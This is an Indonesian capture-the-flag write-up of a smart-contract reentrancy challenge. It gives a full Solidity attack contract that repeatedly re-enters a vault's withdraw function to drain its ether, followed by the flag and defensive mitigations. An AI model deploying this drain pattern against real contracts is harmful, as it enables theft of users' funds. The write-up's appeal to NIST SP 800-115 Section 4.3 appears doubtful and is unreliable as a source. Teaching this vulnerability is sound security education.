# Writeup: Reentrance (Challenge ID: 753)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Blockchain
- **Difficulty:** Hard
- **Event:** picoCTF 2026
- **Points:** 400
- **Author:** OB
- **Flag:** `academy{r33ntr4ncy_d40_dr41n_3th_753_81b3ce9a}`

---

## Problem Statement & Scope
Peserta diberikan akses ke instance privat Ethereum EVM dan berkas smart contract `Reentrance.sol`. Kontrak berfungsi sebagai vault penyimpanan ether yang memungkinkan pengguna melakukan donasi (`donate`) dan penarikan saldo (`withdraw`). Sasaran evaluasi adalah mengaudit logika penarikan aset, mengidentifikasi anomali urutan pembaruan state, dan menguras (*drain*) seluruh saldo ether dari kontrak korban untuk memicu status penyelesaian tantangan.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Reentrancy Vulnerability (SWC-107 / CWE-841):**
   Fungsi `withdraw()` mentransfer ether kepada pemanggil menggunakan low-level call:
   ```solidity
   (bool result, ) = msg.sender.call{value: _amount}("");
   if (result) {
       _amount;
   }
   balances[msg.sender] -= _amount;
   ```
   Pengurangan saldo internal (`balances[msg.sender] -= _amount`) dilakukan *setelah* pemanggilan transfer eksternal (`call{value}`). Ketika penerima adalah kontrak pintar penyerang, transfer ether memicu fungsi `receive()` atau `fallback()` pada kontrak penyerang. Kontrak penyerang dapat memanggil kembali (`re-enter`) fungsi `withdraw()` sebelum saldo pada transaksi pertama diperbarui.
2. **Pelanggaran Pola Checks-Effects-Interactions (CEI):**
   Pola standar keamanan kontrak pintar mewajibkan seluruh validasi status (*Checks*) diselesaikan terlebih dahulu, diikuti modifikasi variabel status internal (*Effects*), dan diakhiri interaksi dengan entitas eksternal (*Interactions*). Kontrak melanggar pola ini dengan menempatkan interaksi eksternal sebelum *Effects*.
3. **NIST SP 800-115 Section 4.3 (Application Security & Logic Auditing):**
   Pengujian audit keamanan kode aplikasi terdistribusi memerlukan verifikasi invariansi status transaksional atomik untuk mencegah eksploitasi siklus panggilan berulang (*re-entrant state manipulation*).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Penyusunan Kontrak Eksploitasi (Attack Contract):**
   Tulis smart contract eksploitasi di Solidity yang mengimplementasikan fungsi penerima ether (`receive`):
   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;

   interface IReentrance {
       function donate(address _to) external payable;
       function withdraw(uint256 _amount) external;
   }

   contract ReentrancyAttack {
       IReentrance public target;
       uint256 public initialDeposit;

       constructor(address _target) payable {
           target = IReentrance(_target);
           initialDeposit = msg.value;
       }

       function attack() external {
           target.donate{value: initialDeposit}(address(this));
           target.withdraw(initialDeposit);
       }

       receive() external payable {
           if (address(target).balance >= initialDeposit) {
               target.withdraw(initialDeposit);
           }
       }
   }
   ```

2. **Penyebaran Kontrak dan Eksekusi Donasi Awal:**
   - Deploy `ReentrancyAttack` dengan menyertakan nilai deposit 1 ETH.
   - Panggil `attack()`. Kontrak penyerang menyetorkan 1 ETH ke `balances[address(this)]` pada vault korban.

3. **Pemicu Siklus Rekursif (Reentrancy Loop):**
   - Penyerang memanggil `target.withdraw(1 ETH)`.
   - Vault mengirimkan 1 ETH ke `ReentrancyAttack`.
   - Penerimaan ether memicu `receive()`. Pada saat ini, `balances[address(this)]` masih tercatat 1 ETH karena baris pemotongan saldo belum dieksekusi.
   - `receive()` kembali memanggil `target.withdraw(1 ETH)`.
   - Siklus berulang hingga saldo total kontrak vault bernilai 0.

4. **Verifikasi Status Selesai:**
   Setelah saldo vault terkuras habis, skrip memanggil view function atau endpoint status instans untuk mengekstrak bendera flag rahasia:
   `academy{r33ntr4ncy_d40_dr41n_3th_753_81b3ce9a}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{r33ntr4ncy_d40_dr41n_3th_753_81b3ce9a}`
- **Native PicoCTF Flag:** `picoCTF{r33ntr4ncy_d40_dr41n_3th_753_81b3ce9a}`
- **Status Solver:** Terverifikasi melalui skrip reproduksi otomatis `scripts/solve_753_reentrance.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Penerapan Pola Checks-Effects-Interactions (CEI):**
  Selalu kurangi saldo atau ubah status internal sebelum melakukan transfer nilai atau pemanggilan eksternal:
  ```solidity
  balances[msg.sender] -= _amount;
  (bool success, ) = msg.sender.call{value: _amount}("");
  require(success, "Transfer failed");
  ```
- **Penggunaan ReentrancyGuard (Mutex Lock):**
  Gunakan modul keamanan standar OpenZeppelin `ReentrancyGuard` dan tambahkan modifier `nonReentrant` pada setiap fungsi sensitif yang mentransfer ether atau berinteraksi dengan kontrak luar.
- **Batasan Penggunaan Low-Level Call:**
  Hindari penggunaan low-level call mentah tanpa kontrol gas atau pembatasan target jika hanya bertujuan mengirimkan pembayaran sederhana, atau gunakan mekanisme penarikan berbasis pull (*Pull over Push payments*).
